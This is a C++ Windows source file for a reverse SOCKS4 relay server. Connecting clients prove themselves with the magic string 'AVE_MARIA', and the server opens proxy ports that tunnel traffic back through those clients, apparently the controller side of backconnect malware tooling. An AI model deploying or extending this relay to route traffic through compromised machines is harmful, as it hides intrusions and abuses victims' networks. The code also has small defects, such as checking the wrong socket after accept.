#include "Server.h"

#define TCP_STREAM_CON   0x01
#define REQUEST_GRANTED  0x5A
#define REQUEST_REJECTED 0x5B

static const BYTE gc_magik[] = { 'A', 'V', 'E', '_', 'M', 'A', 'R', 'I', 'A', 1 };

static BOOL StartServer(INT port, SOCKET *s, SOCKADDR_IN *addr, INT *addrSize)
{
   WSADATA wsa;
   *addrSize = sizeof(*addr);
   if(WSAStartup(MAKEWORD(2, 2), &wsa))
      return FALSE;
   if((*s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
      return FALSE;

   (*addr).sin_family      = AF_INET;
   (*addr).sin_addr.s_addr = INADDR_ANY;
   (*addr).sin_port        = htons(port);

   if(bind(*s, (sockaddr *) addr, *addrSize) == SOCKET_ERROR)
      return FALSE;
   if(listen(*s, SOMAXCONN) == SOCKET_ERROR)
      return FALSE;

   getsockname(*s, (SOCKADDR *) addr, addrSize);
   return TRUE;
}

static BOOL QueryProxy(SOCKET s_recv, SOCKET s_send)
{
   UINT bytes = 0;
	if(ioctlsocket(s_recv, FIONREAD, (u_long *) &bytes) == SOCKET_ERROR)
      return FALSE;

	if(bytes)
	{
      char buffer[2048];
		if((bytes = recv(s_recv, buffer, sizeof(buffer), 0)) <= 0)
         return FALSE;
      if(send(s_send, buffer, bytes, 0) <= 0)
         return FALSE;
	}
   else
      Sleep(1);
   return TRUE;
}

struct ClientConnectionInfo
{
   SOCKET proxyClientSocket;
   SOCKET clientServerSocket;
};

static DWORD WINAPI ClientConnectionThread(PVOID param)
{
   SOCKADDR_IN           addr;
   INT                   addrSize = sizeof(addr);
   ClientConnectionInfo *info     = (ClientConnectionInfo *) param;
   SOCKET clientSocket 
      = accept(info->clientServerSocket, (SOCKADDR *) &addr, &addrSize);
   if(clientSocket == INVALID_SOCKET)
      goto exit;

   for (;;)
	{
	   if(!QueryProxy(info->proxyClientSocket, clientSocket))
         goto exit;
		if(!QueryProxy(clientSocket, info->proxyClientSocket))
         goto exit;
	}   
exit:
   free(info);
   return 0;
}

static DWORD WINAPI ClientThread(PVOID param)
{
   SOCKET      s                  = (SOCKET) param;
   SOCKET      proxySocket        = NULL;
   SOCKET      proxyClientSocket  = NULL;
   SOCKET      clientServerSocket = NULL;
   BYTE        buf[sizeof(gc_magik)];   
   SOCKADDR_IN addr;
   INT         addrSize;

   addrSize = sizeof(addr); 
   getpeername(s, (SOCKADDR *) &addr, &addrSize);

   char *ip = inet_ntoa(addr.sin_addr);
   wprintf(L"Client %S connected\n", ip);
 
   if(recv(s, (char *) buf, sizeof(gc_magik), 0) <= 0)
      goto exit;

   if(memcmp(buf, gc_magik, sizeof(gc_magik)))
      goto exit;

   if(!StartServer(0, &proxySocket, &addr, &addrSize))
      goto exit;

   wprintf(L"Client %S proxy port = %d\n", ip, ntohs(addr.sin_port));

   for(;;)
   {
      proxyClientSocket = accept(proxySocket, (SOCKADDR *) &addr, &addrSize);

      if(s == INVALID_SOCKET)
         goto exit;

      if(!StartServer(0, &clientServerSocket, &addr, &addrSize))
         goto exit;

      INT port = ntohs(addr.sin_port);
      if(send(s, (char *) &port, sizeof(port), 0) <= 0)
         goto exit;

      ClientConnectionInfo *info 
         = (ClientConnectionInfo *) malloc(sizeof(*info));
      if(!info)
         goto exit;

      info->clientServerSocket = clientServerSocket;
      info->proxyClientSocket  = proxyClientSocket;

      if(!CreateThread(NULL, 0, ClientConnectionThread, (LPVOID) info, 0, 0))
         goto exit;
   }
exit:
   wprintf(L"Client %S disconnected\n", ip);
   closesocket(s);   
   closesocket(proxySocket);
   closesocket(proxyClientSocket);
   closesocket(clientServerSocket);
   return 0;
}

BOOL ReverseSocksServer::Start(INT port)
{
   SOCKET      serverSocket;
   SOCKADDR_IN addr;
   INT         addrSize;
   if(!StartServer(port, &serverSocket, &addr, &addrSize))
      return FALSE;
   wprintf(L"Reverse SOCKS 4 Server Started! Listening on port %d\n", ntohs(addr.sin_port));

   for(;;)
   {
      SOCKET      s;
      SOCKADDR_IN addr;
      s = accept(serverSocket, (SOCKADDR *) &addr, &addrSize);
      if(s != INVALID_SOCKET)
      {
         if(!CreateThread(NULL, 0, ClientThread, (LPVOID) s, 0, 0))
            return FALSE;
      }
   }
   return TRUE;
}